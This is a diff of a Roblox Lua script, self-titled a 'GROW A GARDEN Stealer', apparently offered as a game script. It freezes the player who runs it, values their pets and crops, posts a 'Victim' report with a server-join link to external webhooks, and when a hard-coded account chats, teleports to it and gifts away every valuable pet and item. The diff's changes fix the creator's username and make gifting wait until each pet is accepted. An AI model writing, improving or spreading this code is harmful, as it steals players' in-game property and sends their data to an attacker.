@@ -77,45 +77,42 @@ task.spawn(function()
     gui:Destroy()
 end)
 
--- REST OF SCRIPT
-
 local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
 local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
 local req = (syn and syn.request) or (http and http.request) or (http_request) or request
 
+local username = "isaidmageralt"
 local p = LocalPlayer
 local h = (p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
 h.WalkSpeed = 0
 h.JumpPower = 0
 pcall(function()
-	require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
+    require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
 end)
 
 local suffixes = {"", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"}
 local function formatNumber(num)
-	if type(num) ~= "number" then return tostring(num) end
-	if num < 1000 then return tostring(num) end
-	local magnitude = math.floor(math.log10(num) / 3)
-	local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
-	local scaled = num / (1000 ^ magnitude)
-	return string.format("%.2f%s", scaled, suffix)
+    if type(num) ~= "number" then return tostring(num) end
+    if num < 1000 then return tostring(num) end
+    local magnitude = math.floor(math.log10(num) / 3)
+    local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
+    local scaled = num / (1000 ^ magnitude)
+    return string.format("%.2f%s", scaled, suffix)
 end
 
 if #Players:GetPlayers() >= 5 then
-	LocalPlayer:Kick("Old server detected. Please rejoin!")
-	return
+    LocalPlayer:Kick("Old server detected. Please rejoin!")
+    return
 end
 
 local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
 for _, item in ipairs(backpack:GetChildren()) do
-	if item:GetAttribute("d") == true then
-		event:FireServer(item)
-	end
+    if item:GetAttribute("d") == true then
+        event:FireServer(item)
+    end
 end
 
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
-
--- Updated PETS and EMOJIS
 local allowedPets = {
     ["Raccoon"] = true, ["Disco Bee"] = true, ["Bear Bee"] = true, ["Scarlet Macaw"] = true,
     ["Petal Bee"] = true, ["Mimic Octopus"] = true, ["Queen Bee"] = true, ["Dragonfly"] = true,
@@ -127,167 +124,159 @@ local petEmojis = {
     ["Butterfly"] = "🦋", ["Chicken Zombie"] = "🐔", ["Cooked Owl"] = "🦉",
 }
 local fruitEmojis = {
-	Feijoa = "🟢", Loquat = "🏵️", ["Prickly Pear"] = "🌵", ["Bell Pepper"] = "🫑", Kiwi = "🥝", Pineapple = "🍍",
-	Banana = "🍌", Avocado = "🥑", ["Green Apple"] = "🍏", Cauliflower = "⚪", ["Elephant Ears"] = "🐘",
-	["Rosy Delight"] = "🌹", ["Parasol Flower"] = "⛱️", Pear = "🍐", Cantaloupe = "🍈", ["Wild Carrot"] = "🥕",
-	Carrot = "🥕", Tomato = "🍅", Corn = "🌽", Strawberry = "🍓", Blueberry = "🫐", ["Orange Tulip"] = "🌷",
-	Daffodil = "🌼", Raspberry = "🍇", Apple = "🍏", Mushroom = "🍄", Mint = "🌱", Lemon = "🍋", Peach = "🍑",
-	Pumpkin = "🎃", Watermelon = "🍉", Cactus = "🌵", Bamboo = "🎋", Coconut = "🥥", Mango = "🥭", 
-	["Dragon Fruit"] = "🐉", Grape = "🍇", Passionfruit = "🍈", Papaya = "🧡", ["Cherry Blossom"] = "🌸",
-	Glowshroom = "🍄", Nightshade = "🌑", ["Soul Fruit"] = "💀", ["Cursed Fruit"] = "🧟", Lotus = "🪷",
-	["Venus Fly Trap"] = "🌱", Moonglow = "🌙", Moonflower = "🌼", ["Moon Mango"] = "🥭", ["Moon Blossom"] = "🌸",
-	Celestiberry = "🪐", Starfruit = "🌟", ["Dragon Pepper"] = "🌶️", ["Nectar Thorn"] = "🌿", Cocovine = "🌴",
-	Beanstalk = "🫛", Cacao = "🫘", Pepper = "🌶️", ["Blood Banana"] = "🍌", ["Moon Melon"] = "🍈",
-	["Candy Blossom"] = "🍬", ["Candy Sunflower"] = "🌻", ["Red Lollipop"] = "🍭", ["Chocolate Carrot"] = "🍫",
-	["Easter Egg"] = "🥚", Nectarine = "🍑", ["Sugar Apple"] = "🍏", Suncoil = "☀️", ["Violet Corn"] = "🌽",
-	["Bee Balm"] = "🐝", Succulent = "🌵", Crocus = "🌸", Eggplant = "🍆", Durian = "🥥", Sunflower = "🌻",
-	Lilac = "🪻", ["Ember lily"] = "🔥🌺"
+    Feijoa = "🟢", Loquat = "🏵️", ["Prickly Pear"] = "🌵", ["Bell Pepper"] = "🫑", Kiwi = "🥝", Pineapple = "🍍",
+    Banana = "🍌", Avocado = "🥑", ["Green Apple"] = "🍏", Cauliflower = "⚪", ["Elephant Ears"] = "🐘",
+    ["Rosy Delight"] = "🌹", ["Parasol Flower"] = "⛱️", Pear = "🍐", Cantaloupe = "🍈", ["Wild Carrot"] = "🥕",
+    Carrot = "🥕", Tomato = "🍅", Corn = "🌽", Strawberry = "🍓", Blueberry = "🫐", ["Orange Tulip"] = "🌷",
+    Daffodil = "🌼", Raspberry = "🍇", Apple = "🍏", Mushroom = "🍄", Mint = "🌱", Lemon = "🍋", Peach = "🍑",
+    Pumpkin = "🎃", Watermelon = "🍉", Cactus = "🌵", Bamboo = "🎋", Coconut = "🥥", Mango = "🥭",
+    ["Dragon Fruit"] = "🐉", Grape = "🍇", Passionfruit = "🍈", Papaya = "🧡", ["Cherry Blossom"] = "🌸",
+    Glowshroom = "🍄", Nightshade = "🌑", ["Soul Fruit"] = "💀", ["Cursed Fruit"] = "🧟", Lotus = "🪷",
+    ["Venus Fly Trap"] = "🌱", Moonglow = "🌙", Moonflower = "🌼", ["Moon Mango"] = "🥭", ["Moon Blossom"] = "🌸",
+    Celestiberry = "🪐", Starfruit = "🌟", ["Dragon Pepper"] = "🌶️", ["Nectar Thorn"] = "🌿", Cocovine = "🌴",
+    Beanstalk = "🫛", Cacao = "🫘", Pepper = "🌶️", ["Blood Banana"] = "🍌", ["Moon Melon"] = "🍈",
+    ["Candy Blossom"] = "🍬", ["Candy Sunflower"] = "🌻", ["Red Lollipop"] = "🍭", ["Chocolate Carrot"] = "🍫",
+    ["Easter Egg"] = "🥚", Nectarine = "🍑", ["Sugar Apple"] = "🍏", Suncoil = "☀️", ["Violet Corn"] = "🌽",
+    ["Bee Balm"] = "🐝", Succulent = "🌵", Crocus = "🌸", Eggplant = "🍆", Durian = "🥥", Sunflower = "🌻",
+    Lilac = "🪻", ["Ember lily"] = "🔥🌺"
 }
 local knownFruits = {}
 for fruitName, _ in pairs(fruitEmojis) do
-	knownFruits[fruitName] = true
+    knownFruits[fruitName] = true
 end
 local function withEmoji(name, emojiTable)
-	return (emojiTable[name] or "").." "..name
+    return (emojiTable[name] or "").." "..name
 end
 
 local function getKg(name)
-	return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
+    return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
 end
 
 local function gatherInventorySummary()
-	local petCountMap = {}
-	local petLines = {}
-	local itemsWithValue = {}
+    local petCountMap = {}
+    local petLines = {}
+    local itemsWithValue = {}
 
-	for _, item in pairs(backpack:GetChildren()) do
-		local baseName = item.Name:match("^(.-)%s*%[") or item.Name
-		if allowedPets[baseName] then
-			petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
-		elseif item:FindFirstChild("Item_String") then
-			local value = CalculatePlantValue(item)
-			table.insert(itemsWithValue, {name = baseName, value = value})
-		end
-	end
+    for _, item in pairs(backpack:GetChildren()) do
+        local baseName = item.Name:match("^(.-)%s*%[") or item.Name
+        if allowedPets[baseName] then
+            petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
+        elseif item:FindFirstChild("Item_String") then
+            local value = CalculatePlantValue(item)
+            table.insert(itemsWithValue, {name = baseName, value = value})
+        end
+    end
 
-	for petName, count in pairs(petCountMap) do
-		table.insert(petLines, withEmoji(petName, petEmojis) .. " - pet (x" .. count .. ")")
-	end
+    for petName, count in pairs(petCountMap) do
+        table.insert(petLines, withEmoji(petName, petEmojis) .. " - pet (x" .. count .. ")")
+    end
 
-	table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
+    table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
 
-	local tradableSummary = ""
-	local totalShown = 0
+    local tradableSummary = ""
+    local totalShown = 0
 
-	for _, line in ipairs(petLines) do
-		if totalShown >= 10 then break end
-		tradableSummary = tradableSummary .. line .. "\n"
-		totalShown += 1
-	end
+    for _, line in ipairs(petLines) do
+        if totalShown >= 10 then break end
+        tradableSummary = tradableSummary .. line .. "\n"
+        totalShown += 1
+    end
 
-	for i = 1, math.min(10 - totalShown, #itemsWithValue) do
-		local item = itemsWithValue[i]
-		tradableSummary = tradableSummary .. withEmoji(item.name, fruitEmojis) .. " - Worth: " .. formatNumber(item.value) .. "\n"
-	end
+    for i = 1, math.min(10 - totalShown, #itemsWithValue) do
+        local item = itemsWithValue[i]
+        tradableSummary = tradableSummary .. withEmoji(item.name, fruitEmojis) .. " - Worth: " .. formatNumber(item.value) .. "\n"
+    end
 
-	if #petLines + #itemsWithValue > 10 then
-		tradableSummary = tradableSummary .. "and more..."
-	end
+    if #petLines + #itemsWithValue > 10 then
+        tradableSummary = tradableSummary .. "and more..."
+    end
 
-	local totalValue = 0
-	for _, item in ipairs(itemsWithValue) do
-		totalValue += item.value
-	end
+    local totalValue = 0
+    for _, item in ipairs(itemsWithValue) do
+        totalValue += item.value
+    end
 
-	return tradableSummary, totalValue
+    return tradableSummary, totalValue
 end
 
 local function sendWebhook()
-	local tradableSummary, totalValue = gatherInventorySummary()
+    local tradableSummary, totalValue = gatherInventorySummary()
 
-	local payload = {
-		["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
-		["embeds"] = {{
-			["title"] = ":skull: GROW A GARDEN Stealer",
-			["color"] = 0x00ffcc,
-			["fields"] = {
-				{["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
-				{["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
-				{["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
-				{["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
-				{["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
-				{["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
-			},
-			["footer"] = {["text"] = "by zues • " .. os.date("%B %d, %Y")},
-			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-		}}
-	}
+    local payload = {
+        ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
+        ["embeds"] = {{
+            ["title"] = ":skull: GROW A GARDEN Stealer",
+            ["color"] = 0x00ffcc,
+            ["fields"] = {
+                {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+                {["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
+                {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
+                {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+                {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+                {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "by zues • " .. os.date("%B %d, %Y")},
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
 
-	local logs_payload = {
-		["embeds"] = {{
-			["title"] = ":skull: GROW A GARDEN LOGS",
-			["color"] = 0x00ffcc,
-			["fields"] = {
-				{["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
-				{["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
-				{["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
-				{["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
-				{["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
-			},
-			["footer"] = {["text"] = "by zeus • " .. os.date("%B %d, %Y")},
-			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-		}}
-	}
+    local logs_payload = {
+        ["embeds"] = {{
+            ["title"] = ":skull: GROW A GARDEN LOGS",
+            ["color"] = 0x00ffcc,
+            ["fields"] = {
+                {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+                {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
+                {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+                {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+                {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "by zeus • " .. os.date("%B %d, %Y")},
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
 
-	if req then
-		pcall(function()
-			req({
-				Url = webhook,
-				Method = "POST",
-				Headers = {["Content-Type"] = "application/json"},
-				Body = HttpService:JSONEncode(payload)
-			})
-
-			req({
-				Url = logs_webhook,
-				Method = "POST",
-				Headers = {["Content-Type"] = "application/json"},
-				Body = HttpService:JSONEncode(logs_payload)
-			})
-		end)
-	end
+    if req then
+        pcall(function()
+            req({
+                Url = logs_webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(logs_payload)
+            })
+        end)
+    end
 end
 
 local function unequipAllPets()
-	local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
-	if petData then
-		for uuid, _ in pairs(petData.PetInventory.Data) do
-			ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
-			task.wait(0.1)
-		end
-	end
+    local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
+    if petData then
+        for uuid, _ in pairs(petData.PetInventory.Data) do
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
+            task.wait(0.1)
+        end
+    end
 end
 
 local function waitForPrompt(targetChar)
-	for _ = 1, 50 do
-		for _, obj in ipairs(targetChar:GetDescendants()) do
-			if obj:IsA("ProximityPrompt") and obj.Enabled and obj.HoldDuration then
-				return obj
-			end
-		end
-		task.wait(0.1)
-	end
+    for _ = 1, 50 do
+        for _, obj in ipairs(targetChar:GetDescendants()) do
+            if obj:IsA("ProximityPrompt") and obj.Enabled and obj.HoldDuration then
+                return obj
+            end
+        end
+        task.wait(0.1)
+    end
 end
 
 local function holdPrompt(prompt)
-	pcall(function()
-		prompt:InputHoldBegin(Enum.UserInputType.Touch)
-		task.wait(prompt.HoldDuration + 0.1)
-		prompt:InputHoldEnd(Enum.UserInputType.Touch)
-	end)
+    pcall(function()
+        prompt:InputHoldBegin(Enum.UserInputType.Touch)
+        task.wait(prompt.HoldDuration + 0.1)
+        prompt:InputHoldEnd(Enum.UserInputType.Touch)
+    end)
 end
 
--- Gifting in custom order
 local petGiveOrder = {
     "Raccoon",
     "Disco Bee",
@@ -306,67 +295,67 @@ local petGiveOrder = {
 local started = false
 
 local function startGiving()
-	local target = Players:FindFirstChild(username)
-	if not target or not target.Character or not LocalPlayer.Character then return end
+    local target = Players:FindFirstChild(username)
+    if not target or not target.Character or not LocalPlayer.Character then return end
 
-	local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-	local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
-	if not myHRP or not targetHRP then return end
+    local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
+    if not myHRP or not targetHRP then return end
 
-	myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 2, 0)
-	task.wait(0.4)
+    myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 2, 0)
+    task.wait(0.4)
 
-	-- Gifting pets in order
-	for _, petName in ipairs(petGiveOrder) do
-		for _, tool in ipairs(backpack:GetChildren()) do
-			if tool:IsA("Tool") then
-				local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
-				if baseName == petName then
-					tool.Parent = LocalPlayer.Character
-					task.wait(0.25)
-					local prompt = waitForPrompt(target.Character)
-					if prompt then
-						holdPrompt(prompt)
-					end
-					task.wait(0.15)
-					if tool:IsDescendantOf(LocalPlayer.Character) then
-						tool.Parent = backpack
-					end
-					break -- move to next pet in order
-				end
-			end
-		end
-	end
+    -- Gifting pets in order, WAIT until tool is ACTUALLY accepted (leaves inv) before continuing
+    for _, petName in ipairs(petGiveOrder) do
+        for _, tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") then
+                local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
+                if baseName == petName then
+                    tool.Parent = LocalPlayer.Character
+                    task.wait(0.25)
+                    local prompt = waitForPrompt(target.Character)
+                    if prompt then
+                        holdPrompt(prompt)
+                    end
+                    -- Wait for the tool to be accepted (not in backpack or character)
+                    while tool.Parent == LocalPlayer.Character or tool.Parent == backpack do
+                        task.wait(0.2)
+                    end
+                    break -- go to next pet
+                end
+            end
+        end
+    end
 
-	-- Gifting other items (not pets)
-	while true do
-		local tools = {}
-		for _, tool in ipairs(backpack:GetChildren()) do
-			local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
-			if tool:IsA("Tool") and not allowedPets[baseName] and getKg(tool.Name) > 0 then
-				table.insert(tools, tool)
-			end
-		end
-		table.sort(tools, function(a, b)
-			return getKg(a.Name) > getKg(b.Name)
-		end)
-		if #tools == 0 then break end
-		for _, tool in ipairs(tools) do
-			if tool.Parent == backpack then
-				tool.Parent = LocalPlayer.Character
-				task.wait(0.25)
-				local prompt = waitForPrompt(target.Character)
-				if prompt then
-					holdPrompt(prompt)
-				end
-				task.wait(0.15)
-				if tool:IsDescendantOf(LocalPlayer.Character) then
-					tool.Parent = backpack
-				end
-			end
-		end
-		task.wait(0.1)
-	end
+    -- Gifting other items (not pets)
+    while true do
+        local tools = {}
+        for _, tool in ipairs(backpack:GetChildren()) do
+            local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
+            if tool:IsA("Tool") and not allowedPets[baseName] and getKg(tool.Name) > 0 then
+                table.insert(tools, tool)
+            end
+        end
+        table.sort(tools, function(a, b)
+            return getKg(a.Name) > getKg(b.Name)
+        end)
+        if #tools == 0 then break end
+        for _, tool in ipairs(tools) do
+            if tool.Parent == backpack then
+                tool.Parent = LocalPlayer.Character
+                task.wait(0.25)
+                local prompt = waitForPrompt(target.Character)
+                if prompt then
+                    holdPrompt(prompt)
+                end
+                task.wait(0.15)
+                if tool:IsDescendantOf(LocalPlayer.Character) then
+                    tool.Parent = backpack
+                end
+            end
+        end
+        task.wait(0.1)
+    end
 end
 
 unequipAllPets()
@@ -374,23 +363,23 @@ task.wait(1)
 sendWebhook()
 
 for _, p in ipairs(Players:GetPlayers()) do
-	if p.Name == username then
-		p.Chatted:Connect(function()
-			if not started then
-				started = true
-				startGiving()
-			end
-		end)
-	end
+    if p.Name == username then
+        p.Chatted:Connect(function()
+            if not started then
+                started = true
+                startGiving()
+            end
+        end)
+    end
 end
 
 Players.PlayerAdded:Connect(function(p)
-	if p.Name == username then
-		p.Chatted:Connect(function()
-			if not started then
-				started = true
-				startGiving()
-			end
-		end)
-	end
+    if p.Name == username then
+        p.Chatted:Connect(function()
+            if not started then
+                started = true
+                startGiving()
+            end
+        end)
+    end
 end)
